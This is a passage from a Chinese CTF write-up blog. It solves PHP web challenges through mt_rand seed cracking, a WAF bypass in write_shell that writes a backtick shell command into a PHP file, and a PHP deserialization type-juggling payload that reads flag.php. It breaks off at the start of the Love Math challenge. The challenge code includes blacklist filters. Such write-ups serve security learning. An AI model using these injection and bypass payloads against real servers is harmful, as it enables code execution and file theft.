class="hljs-string">&#x27; &#x27;</span> +<span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + length + <span class="hljs-string">&#x27; &#x27;</span><br>            break<br><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result)</span></span><br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">5</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">9</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">14</span> <span class="hljs-number">14</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">35</span> <span class="hljs-number">35</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">60</span> <span class="hljs-number">60</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">22</span> <span class="hljs-number">22</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">9</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">33</span> <span class="hljs-number">33</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure>

<p>3.下载php_mt_seed工具并且使用</p>
<p><img src="https://i.imgs.ovh/2023/11/20/HODpv.png" srcset="/img/loading.gif" lazyload alt="image-20231120213315052"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">17749670</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;p1&#x27;</span>&gt;</span>fjoC9Ygwj7O4LXcygiZf<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br></code></pre></td></tr></table></figure>

<p>上传得到flag</p>
<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>提供了查看路径和写入文件的功能，但是存在WAF机制，不允许写入黑名单中的内容。</p>
<p>使用echo标记简写<code>&lt;?=</code>绕过<code>&lt;?php </code>的限制，再用<code>.</code>来连接p和hp，因为分号被过滤掉了，只执行一行语句可以省略：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/?action=upload&amp;<span class="hljs-class"><span class="hljs-keyword">data</span>=&lt;?=(<span class="hljs-title">ph</span>.<span class="hljs-title">pinfo</span>)()?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/?action=upload&amp;<span class="hljs-class"><span class="hljs-keyword">data</span>=&lt;?=(<span class="hljs-title">ph</span>.<span class="hljs-title">pinfo</span>)()?&gt;</span><br></code></pre></td></tr></table></figure>

<p>访问发现写入成功</p>
<p>查询文件，用%09代替空格：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?a</span>ction=upload&amp;data=&lt;<span class="hljs-string">?=</span><span class="hljs-string">`ls%09/`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>查看flag</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?a</span>ction=upload&amp;data=&lt;<span class="hljs-string">?=</span><span class="hljs-string">`cat%09/flllllll1112222222lag`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>        <span class="hljs-keyword">die</span>();<br>      &#125;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>      <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>      <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>      <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>  &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>  <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>get传入一个序列化后的类对象</p>
<p>需要绕过</p>
<p><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascli值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00,不符合上面的要求。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>destruct()魔术方法</strong><br>op&#x3D;&#x3D;&#x3D;”2”，是强比较</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>KOTLIN<br></code></pre></td></tr></table></figure>

<p>而在process()函数中，op&#x3D;&#x3D;”2”是弱比较</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>所以可以使传入的op为数字2，从而使第一个强比较返回false，而使第二个弱比较返回true</p>
<p>序列化操作：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-comment">#public  $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//因为destruct函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">?<span class="hljs-built_in">str</span>=O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = 